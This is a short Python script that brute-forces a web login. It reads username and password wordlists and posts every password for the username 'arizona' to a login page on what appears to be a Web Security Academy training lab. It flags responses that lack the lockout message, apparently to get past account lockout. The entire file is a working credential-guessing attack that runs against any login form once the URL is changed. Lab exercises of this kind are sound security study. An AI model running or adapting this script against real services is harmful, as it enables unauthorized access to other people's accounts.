
import requests
import random

fd = open('usernames.txt','r')
wordlist = fd.read()
fd.close()

usernames = list(wordlist.split('\n'))
#print(usernames)

fd = open('passwords.txt','r')
wordlist = fd.read()
fd.close()

passwords = list(wordlist.split('\n'))
#print(passwords)

url = "https://acff1f9b1e96e5a2c01a2078009700b6.web-security-academy.net/login"



#username=admin&password=admin
#arizona

for i in passwords:
	
	data2 = {
			"username":"arizona",
			"password":i
	}

	r = requests.post(url,data=data2)

	if "too many incorrect login attempts" not in r.text:
			print("Check this password {}".format(i))
			print(r.text)

